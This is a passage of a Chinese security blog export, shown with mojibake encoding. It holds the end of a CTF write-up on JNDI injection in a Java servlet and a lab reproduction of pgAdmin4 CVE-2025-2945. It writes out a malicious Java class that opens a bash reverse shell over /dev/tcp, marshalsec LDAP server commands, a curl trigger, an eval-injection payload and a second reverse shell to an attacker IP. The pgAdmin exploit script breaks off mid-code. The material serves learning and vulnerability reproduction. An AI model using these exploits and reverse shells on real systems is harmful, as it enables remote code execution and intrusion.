é…ç½®ï¼š\né…ç½®ä¸­å®šä¹‰äº†ä¸€ä¸ªåä¸ºwelcomeServletçš„ Servletï¼Œå¯¹åº”çš„ç±»æ˜¯ctf.n1cat.welcomeServletï¼Œå¹¶ä¸”æ˜ å°„åˆ°url-pattern: /ï¼ˆå³æ ¹è·¯å¾„ï¼‰\nåˆ\nåœ¨ Java Web åº”ç”¨ä¸­ï¼ŒServlet ç±»çš„å­—èŠ‚ç æ–‡ä»¶ï¼ˆ.classï¼‰é€šå¸¸å­˜æ”¾åœ¨WEB-INF/classes/ç›®å½•ä¸‹ï¼Œè·¯å¾„ä¸åŒ…åå¯¹åº”ï¼ˆåŒ…åä¸­çš„.å¯¹åº”ç›®å½•åˆ†éš”ç¬¦/ï¼‰ã€‚\nctf.n1cat.welcomeServlet\nçš„å®Œæ•´è·¯å¾„ä¸ºï¼š\nWEB-INF/classes/ctf/n1cat/welcomeServlet.class\næ‰€ä»¥å°è¯•è¯»ä¸€ä¸‹/download?path=%2FWEB-INF%2Fclasses%2Fctf%2Fn1cat%2FwelcomeServlet.class\nå¾—åˆ°ä¸€ä¸ªdownloadæ–‡ä»¶ï¼Œæ‰”è¿›JADXé‡Œåç¼–è¯‘ä¸€ä¸‹ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 package ctf.n1cat; import com.fasterxml.jackson.core.JsonProcessingException; import com.fasterxml.jackson.databind.ObjectMapper; import com.fasterxml.jackson.databind.node.ObjectNode; import java.io.IOException; import java.io.PrintWriter; import java.net.URLEncoder; import java.nio.charset.StandardCharsets; import javax.servlet.RequestDispatcher; import javax.servlet.ServletException; import javax.servlet.annotation.WebServlet; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; @WebServlet(name = \u0026#34;welcomeServlet\u0026#34;, value = {\u0026#34;/\u0026#34;}) /* loaded from: download */ public class welcomeServlet extends HttpServlet { private static final String DEFAULT_NAME = \u0026#34;guest\u0026#34;; private static final String DEFAULT_WORD = \u0026#34;welcome\u0026#34;; private static final ObjectMapper OBJECT_MAPPER = new ObjectMapper(); protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException { String requestUri = request.getRequestURI(); String contextPath = request.getContextPath(); String pathWithinApp = requestUri.substring(contextPath.length()); if (shouldDelegate(pathWithinApp)) { delegateToDefaultResource(pathWithinApp, request, response); return; } String jsonPayload = request.getParameter(\u0026#34;json\u0026#34;); String nameParam = request.getParameter(\u0026#34;name\u0026#34;); String wordParam = request.getParameter(\u0026#34;word\u0026#34;); String urlParam = request.getParameter(\u0026#34;url\u0026#34;); if (isBlank(jsonPayload) \u0026amp;\u0026amp; !isBlank(nameParam) \u0026amp;\u0026amp; !isBlank(wordParam)) { ObjectNode composed = OBJECT_MAPPER.createObjectNode(); composed.put(\u0026#34;name\u0026#34;, nameParam); composed.put(\u0026#34;word\u0026#34;, wordParam); if (!isBlank(urlParam)) { composed.put(\u0026#34;url\u0026#34;, urlParam); } jsonPayload = composed.toString(); } if (isBlank(jsonPayload)) { response.sendRedirect(defaultRedirectTarget(request)); return; } try { User user = (User) OBJECT_MAPPER.readValue(jsonPayload, User.class); String name = user.getName(); String word = user.getWord(); String url = user.getUrl(); if (isBlank(name) || isBlank(word)) { response.sendRedirect(defaultRedirectTarget(request)); } else { renderResponse(response, name, word, url); } } catch (RuntimeException e) { response.sendError(400, \u0026#34;Invalid user data\u0026#34;); } catch (JsonProcessingException e2) { response.sendError(400, \u0026#34;Invalid JSON payload\u0026#34;); } } private boolean shouldDelegate(String pathWithinApp) { return (pathWithinApp == null || pathWithinApp.isEmpty() || \u0026#34;/\u0026#34;.equals(pathWithinApp)) ? false : true; } private void delegateToDefaultResource(String pathWithinApp, HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { RequestDispatcher defaultDispatcher = getServletContext().getNamedDispatcher(\u0026#34;default\u0026#34;); if (defaultDispatcher != null) { defaultDispatcher.forward(request, response); } else { request.getRequestDispatcher(pathWithinApp).forward(request, response); } } private void renderResponse(HttpServletResponse response, String name, String word, String url) throws IOException { response.setContentType(\u0026#34;text/html;charset=UTF-8\u0026#34;); PrintWriter out = response.getWriter(); try { out.println(\u0026#34;\u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026#34;); out.println(\u0026#34;\u0026lt;h1\u0026gt;\u0026#34; + escapeHtml(name) + \u0026#34;\u0026lt;/h1\u0026gt;\u0026#34;); out.println(\u0026#34;\u0026lt;p\u0026gt;\u0026#34; + escapeHtml(word) + \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;); if (!isBlank(url)) { out.println(\u0026#34;\u0026lt;p\u0026gt;URL: \u0026#34; + escapeHtml(url) + \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;); } out.println(\u0026#34;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;); if (out != null) { out.close(); } } catch (Throwable th) { if (out != null) { try { out.close(); } catch (Throwable th2) { th.addSuppressed(th2); } } throw th; } } private String escapeHtml(String input) { if (input == null) { return \u0026#34;\u0026#34;; } return input.replace(\u0026#34;\u0026amp;\u0026#34;, \u0026#34;\u0026amp;amp;\u0026#34;).replace(\u0026#34;\u0026lt;\u0026#34;, \u0026#34;\u0026amp;lt;\u0026#34;).replace(\u0026#34;\u0026gt;\u0026#34;, \u0026#34;\u0026amp;gt;\u0026#34;).replace(\u0026#34;\\\u0026#34;\u0026#34;, \u0026#34;\u0026amp;quot;\u0026#34;).replace(\u0026#34;\u0026#39;\u0026#34;, \u0026#34;\u0026amp;#x27;\u0026#34;); } private String defaultRedirectTarget(HttpServletRequest request) { return request.getContextPath() + \u0026#34;/?name=\u0026#34; + urlEncode(DEFAULT_NAME) + \u0026#34;\u0026amp;word=\u0026#34; + urlEncode(DEFAULT_WORD); } private boolean isBlank(String value) { return value == null || value.trim().isEmpty(); } private String urlEncode(String value) { return URLEncoder.encode(value, StandardCharsets.UTF_8); } } å¯ä»¥çœ‹åˆ°æœ‰ä¸ªUserç±»ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½è¯»åˆ°è¿™ä¸ªUserç±»ï¼Œç”¨åŒæ ·çš„æ–¹æ³•è¯»/download?path=WEB-INF%2Fclasses%2Fctf%2Fn1cat%2FUser.classå¾—åˆ°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 package ctf.n1cat; import javax.naming.InitialContext; import javax.naming.NamingException; /* loaded from: download(1) */ public class User { private String name; private String word; private String url; public String getName() { return this.name; } public String getWord() { return this.word; } public void setWord(String password) { this.word = password; } public void setName(String name) throws NamingException { this.name = name; } public String getUrl() { return this.url; } public void setUrl(String url) { try { new InitialContext().lookup(url); } catch (NamingException e) { throw new RuntimeException((Throwable) e); } } } å¯ä»¥çœ‹åˆ°è¿™ä¸ªUserç±»ä¸­çš„setUrlå­˜åœ¨JNDIæ¼æ´\næ¼æ´ç¯‡ - JNDI æ³¨å…¥è¯¦è§£\nåˆ©ç”¨ä½ç‰ˆæœ¬çš„JNDIæ¼æ´éœ€è¦åšä¸¤ä¸ªå‡†å¤‡å·¥ä½œ\né¦–å…ˆè¦æ­å»ºä¸€ä¸ªRMI/LDAP æœåŠ¡\nç„¶ååœ¨æœ¬æœºä¸Šå¯ä¸€ä¸ªHTTPæœåŠ¡\næƒ³è¦åå¼¹shellè¿˜è¦é¢å¤–å‡†å¤‡\nåˆ©ç”¨æ€è·¯æ˜¯å…ˆç¼–å†™ä¸€ä¸ªæ¶æ„çš„Javaç±»\n1 2 3 4 5 6 7 import java.io.IOException; public class Exploit { public Exploit() throws IOException { String cmd = \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/IP/port 0\u0026gt;\u0026amp;1\u0026#34;; Runtime.getRuntime().exec(new String[]{\u0026#34;/bin/sh\u0026#34;, \u0026#34;-c\u0026#34;, cmd}); } } ç¼–è¯‘æˆclassä¹‹åä½¿ç”¨LDAPæœåŠ¡å¼•å¯¼æœåŠ¡å™¨è®¿é—®HTTPæœåŠ¡ä¸‹è½½æˆ‘ä»¬å‡†å¤‡å¥½çš„classæ–‡ä»¶å¹¶æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°RCEçš„ç›®çš„\nè¿™é‡Œä½¿ç”¨marshalsecæ¥æ­å»ºLDAPæœåŠ¡\nmarshalsec\nè¿™ä¸ªå·¥å…·éœ€è¦è‡ªå·±æ‰“åŒ…æˆjaråŒ…ï¼Œæ‰€ä»¥æœ¬åœ°éœ€è¦æœ‰Javaç¯å¢ƒ\n1 2 python -m http.server 8080 //å…ˆå¯ä¸€ä¸ªHTTPæœåŠ¡ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \u0026#34;IP:Port\u0026#34; 1389 //LDAPæœåŠ¡ æœ€åä½¿ç”¨curlå‘æœåŠ¡å™¨ä¼ å‚æ¥å¼•å¯¼æœåŠ¡å™¨è®¿é—®LDAPæœåŠ¡ï¼Œæœ€ç»ˆRCE\n1 curl \u0026#34;http://xx.xxx.xxx.xxx:xxxxx/?json=%7B%22name%22:%22test%22,%22word%22:%22test%22,%22url%22:%22ldap://xx.xxx.xxx.xxxxxx.xx:xxxxx/ClassName%22%7D\u0026#34; æœ¬æ¥å¦‚æœæ˜¯ä½ç‰ˆæœ¬JDKåˆ°è¿™é‡Œå°±ç»“æŸäº†ï¼Œä½†åç»­æ€æ ·å°è¯•éƒ½æ— å›æ˜¾ï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯é«˜ç‰ˆæœ¬ï¼Œç”±äºé«˜ç‰ˆæœ¬JDKé»˜è®¤ä¸ä¿¡ä»»å¤–éƒ¨ä»£ç ï¼Œæ‰€ä»¥è¿™é“é¢˜ä¸èƒ½è¿™ä¹ˆç®€å•å°±åšå‡ºæ¥ï¼Œè¿˜éœ€è¦æƒ³åˆ«çš„åŠæ³•ã€‚\nå‚è€ƒï¼š\nApache Tomcat RewriteValveç›®å½•éå†æ¼æ´ | CVE-2025-55752 å¤ç°\næ¼æ´ç¯‡ - JNDI æ³¨å…¥è¯¦è§£\nã€å·²å¤ç°ã€‘Apache Tomcat è·¯å¾„éå†æ¼æ´ | åˆ©ç”¨æœ‰å‰ç½®æ¡ä»¶(CVE-2025-55752)\nJavaååºåˆ—åŒ–å·¥å…·-marshalsec\n","date":"2025-11-02T00:00:00Z","permalink":"https://Oight.github.io/p/n1ctf2025-n1cat1/3/","title":"N1CTF2025 n1cat(1/3)"},{"content":"pgAdmin4 è®¤è¯åè¿œç¨‹ä»£ç æ‰§è¡Œï¼ˆCVE-2025-2945ï¼‰æ¼æ´å¤ç°\rå¼€æºçš„å¿«ä¹ ğŸ˜ å°±æ˜¯æºç éšæ‰‹å¯å¾— ğŸ“‚ ç»ˆäºèƒ½å¤ç° CVE ğŸ¤“ ä¸æ˜¯é çŒœæƒ³å’Œåç¼–è¯‘ ğŸ”\nä»¥å‰é‡åˆ°é—­æº ğŸ˜© æºç è¢«é”åŒ èˆ¬è—èµ· ğŸ”\nç°åœ¨ä¸€æ‰“å¼€å°±æ˜¯æ˜æ–‡å‡½æ•° ğŸ§¾ å¿ƒé‡Œå¥½çˆ½ ğŸ¥°\nå¤ç°è¿‡ç¨‹åƒè§£è°œ ğŸ§© æ¯ä¸€æ­¥éƒ½æ‰å®åˆè¸å® ğŸ‘\nè¦çˆ†äº†ğŸ’¥ğŸ’¥ğŸ’¥ æˆåŠŸå¤ç°ï¼æ¼æ´å†ç°ï¼ï¼ï¼ğŸ¤¯\nå¼€æºå®‰å…¨ç ”ç©¶ ğŸ¶ è‡ªç”±ã€é€æ˜ã€å¯å¤ç° âœ¨\næ¼æ´æè¿°\rpgAdminæ˜¯é’ˆå¯¹PostgreSQLæ•°æ®åº“çš„æŸ¥è¯¢å®¢æˆ·ç«¯ï¼Œå…¶æ”¯æŒserveræ¨¡å¼éƒ¨ç½²ã€‚\nåœ¨å—å½±å“ç‰ˆæœ¬ä¸­ï¼Œç”±äºQuery ToolåŠCloud DeploymentåŠŸèƒ½å®ç°ä¸­ç›´æ¥é€šè¿‡eval()è§£æä¼ å…¥å‚æ•°ï¼Œå¯¼è‡´å­˜åœ¨ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚\næ­¤æ¼æ´ä¸ºä»¥å·²å®Œæˆèº«ä»½éªŒè¯åä¸ºå‰ææ¡ä»¶çš„RCE\nè§£å†³å»ºè®®\r\u0026ldquo;å°†ç»„ä»¶ pgadmin4 å‡çº§è‡³ 9.2 åŠä»¥ä¸Šç‰ˆæœ¬\u0026rdquo;\næ¼æ´å¤ç°\ræ¼æ´åˆ†æ\rå…ˆçœ‹çœ‹æºç ï¼Œæ¬è¿‡æ¥äº†ä¿®è¿‡çš„ä»£ç : åœ°å€\nåœ¨è¿™ä¸ªè·¯å¾„ä¸‹ï¼šweb/pgadmin/tools/sqleditor/__init__.py\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 @pga_login_required def start_query_download_tool(trans_id): (status, error_msg, sync_conn, trans_obj, session_obj) = check_transaction_status(trans_id) if not status or sync_conn is None or trans_obj is None or \\ session_obj is None: return internal_server_error( errormsg=TRANSACTION_STATUS_CHECK_FAILED ) data = request.values if request.values else request.get_json(silent=True) if data is None: return make_json_response( status=410, success=0, errormsg=gettext( \u0026#34;Could not find the required parameter (query).\u0026#34; ) ) try: sql = None query_commited = data.get(\u0026#39;query_commited\u0026#39;, False) # Iterate through CombinedMultiDict to find query. for key, value in data.items(): if key == \u0026#39;query\u0026#39;: sql = value if key == \u0026#39;query_commited\u0026#39;: query_commited = ( - eval(value) if isinstance(value, str) else value # è¿™é‡Œçš„eval æ˜¯æ¼æ´ç‚¹ï¼Œå·²ç»è¢«åˆ é™¤äº† + value.lower() in (\u0026#39;true\u0026#39;, \u0026#39;1\u0026#39;) if isinstance( ## æ–°å¢äº†è¿™ä¸¤è¡Œ + value, str) else value ) if not sql: sql = trans_obj.get_sql(sync_conn) if sql and query_commited: # Re-execute the query to ensure the latest data is included sync_conn.execute_async(sql) # This returns generator of records. status, gen, conn_obj = \\ sync_conn.execute_on_server_as_csv(records=10) if not status: return make_json_response( data={ \u0026#39;status\u0026#39;: status, \u0026#39;result\u0026#39;: gen } ) æˆ‘ä»¬çœ‹åˆ°ï¼Œé¦–å…ˆè¿™é‡Œä½¿ç”¨@pga_login_requiredåšäº†ç™»å½•éªŒè¯ï¼Œç„¶åä»è¯·æ±‚ä¸­è·å–æ•°æ®ï¼Œsqlè·å–æŸ¥è¯¢è¯­å¥ï¼Œquery_commitedæœ¬æ¥æœŸæœ›è·å–ä¸€ä¸ªå¸ƒå°”å‹æ•°æ®ç”¨æ¥åˆ¤æ–­æ˜¯å¦åœ¨ä¸‹è½½å‰é‡æ–°æ‰§è¡ŒæŸ¥è¯¢ï¼Œä»¥ä¿è¯æ•°æ®æ—¶æ•ˆæ€§ã€‚\nä½†è¿™é‡Œç›´æ¥ä½¿ç”¨äº†eval() ä¸”å®Œå…¨æ²¡æœ‰è¿‡æ»¤ï¼Œå¯¼è‡´å¯ä»¥ç›´æ¥æ§åˆ¶query_commitedä¼ å…¥æ¶æ„è¯­å¥ä»è€Œå‘½ä»¤æ‰§è¡Œã€‚\nåŒæ ·çš„åœ¨è¿™é‡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 def _create_google_postgresql_instance(self, args): credentials = self._get_credentials(self._scopes) service = discovery.build(\u0026#39;sqladmin\u0026#39;, \u0026#39;v1beta4\u0026#39;, credentials=credentials) - high_availability = \\ - \u0026#39;REGIONAL\u0026#39; if eval(args.high_availability) else \u0026#39;ZONAL\u0026#39; # è¿™é‡Œ + + _high_availability = args.high_availability.lower() in ( + \u0026#39;true\u0026#39;, \u0026#39;1\u0026#39;) if isinstance(args.high_availability, str + ) else args.high_availability + + high_availability = \u0026#39;REGIONAL\u0026#39; if _high_availability else \u0026#39;ZONAL\u0026#39; db_password = self._database_password \\ if self._database_password is not None else args.db_password ip = args.public_ip if args.public_ip else \u0026#39;{}/32\u0026#39;.format(get_my_ip()) authorized_networks = self.get_authorized_network_list(ip) database_instance_body = { \u0026#39;databaseVersion\u0026#39;: args.db_version, \u0026#39;instanceType\u0026#39;: \u0026#39;CLOUD_SQL_INSTANCE\u0026#39;, \u0026#39;project\u0026#39;: args.project, \u0026#39;name\u0026#39;: args.name, \u0026#39;region\u0026#39;: args.region, \u0026#39;gceZone\u0026#39;: args.availability_zone, \u0026#39;secondaryGceZone\u0026#39;: args.secondary_availability_zone, \u0026#34;rootPassword\u0026#34;: db_password, \u0026#39;settings\u0026#39;: { \u0026#39;tier\u0026#39;: args.instance_type, \u0026#39;availabilityType\u0026#39;: high_availability, \u0026#39;dataDiskType\u0026#39;: args.storage_type, \u0026#39;dataDiskSizeGb\u0026#39;: args.storage_size, \u0026#39;ipConfiguration\u0026#39;: { \u0026#34;authorizedNetworks\u0026#34;: authorized_networks, \u0026#39;ipv4Enabled\u0026#39;: True }, } } ä¹Ÿå‡ºç°äº†æœªç»æ ¡éªŒçš„eval() ï¼Œè¿™é‡ŒåŒæ ·æ˜¯æœŸå¾…ä¼ å…¥å¸ƒå°”å€¼ï¼Œç”¨äºåˆ¤æ–­æ˜¯å¦å¯ç”¨high_availabilityä½†æ˜¯æœªç»æ ¡éªŒå¯¼è‡´å¯ä»¥ä¼ å…¥æ¶æ„è¯­å¥è¿›è¡ŒRCE\nå¤ç°\rçœ‹åˆ°äº†ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„CVEå¤ç°å·¥å…·vulhub ,é‡Œé¢æ”¶é›†äº†å¾ˆå¤šCVEï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨docker composeè¿›è¡Œæœ¬åœ°éƒ¨ç½²å¤ç°ï¼Œéå¸¸æ–¹ä¾¿\nVulhub\nåœ¨kalié‡Œé¢å¯ä¸€ä¸ªpgadmin4\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ cd vulhub â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub] â””â”€$ ls 1panel bash discuz fastjson gogs java kkfileview minio openfire postgres scrapy thinkphp yapi activemq cacti django ffmpeg gradio jboss langflow mojarra opensmtpd python shiro tikiwiki zabbix adminer celery dns flask grafana jenkins laravel mongo-express openssh rails showdoc tomcat airflow cgi docker flink h2database jetty librsvg mysql openssl README.md skywalking unomi aj-report cmsms drupal geoserver hadoop jimureport libssh nacos opentsdb README.zh-cn.md solr uwsgi apache-cxf coldfusion dubbo ghostscript hertzbeat jira LICENSE neo4j pdfjs redis spark v2board apache-druid confluence ecshop git httpd jmeter liferay-portal next.js pgadmin rocketchat spring vite apereo-cas contributors.md elasticsearch gitea hugegraph joomla log4j nexus php rocketmq struts2 weblogic apisix contributors.zh-cn.md electron gitlab imagemagick jumpserver magento nginx phpmailer rsync superset webmin appweb couchdb elfinder gitlist influxdb jupyter metabase node phpmyadmin ruby supervisor wordpress aria2 craftcms environments.toml glassfish ingress-nginx kafka metersphere ntopng phpunit saltstack teamcity xstream base cups-browsed erlang goahead jackson kibana mini_httpd ofbiz polkit samba tests xxl-job â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub] â””â”€$ cd pgadmin â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub/pgadmin] â””â”€$ ls CVE-2022-4223 CVE-2023-5002 CVE-2025-2945 â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub/pgadmin] â””â”€$ cd CVE-2025-2945 â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub/pgadmin/CVE-2025-2945] â””â”€$ ls 1.png docker-compose.yml exp.py README.md README.zh-cn.md â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub/pgadmin/CVE-2025-2945] â””â”€$ sudo docker-compose up -d [sudo] kali çš„å¯†ç ï¼š [+] Running 20/20 âœ” web Pulled 105.3s âœ” ce1261c6d567 Pull complete 12.4s âœ” 7a1f3f33da57 Pull complete 12.5s âœ” 251e9d4b1ce9 Pull complete 13.0s âœ” 162926a937ce Pull complete 13.0s âœ” 2cc27ca26634 Pull complete 92.4s âœ” e8124a63a8bc Pull complete 92.4s âœ” 33297183fcda Pull complete 92.4s âœ” afecadf008dc Pull complete 92.4s âœ” pgsql Pulled 59.4s âœ” 2d35ebdb57d9 Pull complete 7.8s âœ” 82e3b18698cd Pull complete 7.8s âœ” 1d12e864e19a Pull complete 9.3s âœ” 10c02ef94427 Pull complete 9.7s âœ” ac28590ba464 Pull complete 39.5s âœ” 11e80b5eea53 Pull complete 39.5s âœ” a5bd5a0b8636 Pull complete 39.5s âœ” aabce23918dc Pull complete 39.5s âœ” 3cecdd37f6f2 Pull complete 39.5s âœ” 5b6f078adbb9 Pull complete 39.5s [+] Running 3/3 âœ” Network cve-2025-2945_default Created 0.1s âœ” Container cve-2025-2945-web-1 Started 0.3s âœ” Container cve-2025-2945-pgsql-1 Started 0.3s â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub/pgadmin/CVE-2025-2945] â””â”€$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES d4b8121370ce vulhub/pgadmin:9.1 \u0026#34;pgadmin4\u0026#34; 27 minutes ago Up 27 minutes 0.0.0.0:5050-\u0026gt;5050/tcp, :::5050-\u0026gt;5050/tcp cve-2025-2945-web-1 8129daffef4d postgres:17-alpine \u0026#34;docker-entrypoint.sâ€¦\u0026#34; 27 minutes ago Up 27 minutes 5432/tcp cve-2025-2945-pgsql-1 â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub/pgadmin/CVE-2025-2945] â””â”€$ ifconfig br-4833c158bebe: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 172.18.0.1 netmask 255.255.0.0 broadcast 172.18.255.255 inet6 fe80::42:9fff:fe05:52a1 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 02:42:9f:05:52:a1 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 docker0: flags=4099\u0026lt;UP,BROADCAST,MULTICAST\u0026gt; mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.17.255.255 ether 02:42:45:05:b9:97 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 2 overruns 0 carrier 0 collisions 0 eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet 192.168.142.129 netmask 255.255.255.0 broadcast 192.168.142.255 inet6 fe80::20c:29ff:fe64:8a0 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 00:0c:29:64:08:a0 txqueuelen 1000 (Ethernet) RX packets 484317 bytes 713860613 (680.7 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 29970 bytes 1947550 (1.8 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10\u0026lt;host\u0026gt; loop txqueuelen 1000 (Local Loopback) RX packets 8 bytes 480 (480.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 8 bytes 480 (480.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 veth2aa17be: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet6 fe80::ce3:a6ff:fe3b:2528 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether 0e:e3:a6:3b:25:28 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 20 bytes 1656 (1.6 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 vethf8d97e1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500 inet6 fe80::d87c:cfff:fe06:d4b0 prefixlen 64 scopeid 0x20\u0026lt;link\u0026gt; ether da:7c:cf:06:d4:b0 txqueuelen 0 (Ethernet) RX packets 0 bytes 0 (0.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 20 bytes 1656 (1.6 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 æ‹¿åˆ°IPå’Œç«¯å£å·ä¹‹åè®¿é—®ï¼Œçœ‹åˆ°ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä½¿ç”¨ç½‘ä¸Šçš„exp\n1 2 3 4 5 python CVE-2025-2946.py --target-url http://192.168.142.129:5050 --username vulhub@example.com --password vulhub --db-user vulhub --db-pass vulhub --db-name vulhub --payload \u0026#34;__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls \u0026gt; hack.txt\u0026#39;)\u0026#34; [+] Successfully authenticated to pgAdmin [+] Found valid server ID: 1 [+] Exploiting the target... [+] Received expected 500 response: {\u0026#34;success\u0026#34;:0,\u0026#34;errormsg\u0026#34;:\u0026#34;Error: not enough values to unpack (expected 3, got 2)\u0026#34;,\u0026#34;info\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;result\u0026#34;:null,\u0026#34;data\u0026#34;:null} å¯ä»¥çœ‹åˆ°å‡ºç°äº†hack.txtï¼Œè¯´æ˜å·²ç»æ‹¿åˆ°æƒé™äº†\n1 2 3 4 5 6 7 â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub/pgadmin/CVE-2025-2945] â””â”€$ docker-compose exec web ls bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var â”Œâ”€â”€(kaliã‰¿kali)-[~/vulhub/pgadmin/CVE-2025-2945] â””â”€$ docker-compose exec web ls bin boot dev etc hack.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var ç›´æ¥__import__('subprocess').run(['bash','-c','bash -i \u0026gt;\u0026amp; /dev/tcp/æ”»å‡»è€…IP/ç«¯å£ 0\u0026gt;\u0026amp;1']) å¯ä»¥åå¼¹shell\nexpï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 #!/usr/bin/env python3 import re from random import randint from urllib.parse import urljoin import requests def get_csrf_token(session: requests.Session, target_url: str) -\u0026gt; str | None: login_resp = session.get(urljoin(target_url, \u0026#39;/login\u0026#39;), allow_redirects=False) if login_resp.status_code == 200: if m := re.search( r\u0026#39;\u0026lt;input name=\u0026#34;csrf_token\u0026#34;( hidden=\u0026#34;\u0026#34;)? value=\u0026#34;([\\w+.-]+)\u0026#34;\u0026gt;\u0026#39;, login_resp.text ): return m.group(2) if m := re.search(r\u0026#39;\u0026#34;csrfToken\u0026#34;: \u0026#34;([\\w+.-]+)\u0026#34;\u0026#39;, login_resp.text): return m.group(1) else: js_resp = session.get(urljoin(target_url, \u0026#39;/browser/js/utils.js\u0026#39;)) if m := re.search(r\u0026#34;pgAdmin\\[\u0026#39;csrf_token\u0026#39;\\]\\s*=\\s*\u0026#39;([^\u0026#39;]+)\u0026#39;\u0026#34;, js_resp.text): return m.group(1) if m := re.search(r\u0026#39;\u0026#34;csrfToken\u0026#34;: \u0026#34;([\\w+.-]+)\u0026#34;\u0026#39;, js_resp.text): return m.group(1) print(\u0026#34;[!] Failed to retrieve CSRF token\u0026#34;) return def exploit( target_url: str, username: str, password: str, db_name: str, db_user: str, db_pass: str, payload: str, max_server_id: int = 10 ) -\u0026gt; bool: \u0026#34;\u0026#34;\u0026#34; pgAdmin4 query tool authenticated RCE (CVE-2025-2945) exp. :return: True if the exploit attempt is (or believed to be) successful, otherwise False. \u0026#34;\u0026#34;\u0026#34; session = requests.Session() # Login csrf_token = get_csrf_token(session, target_url) if 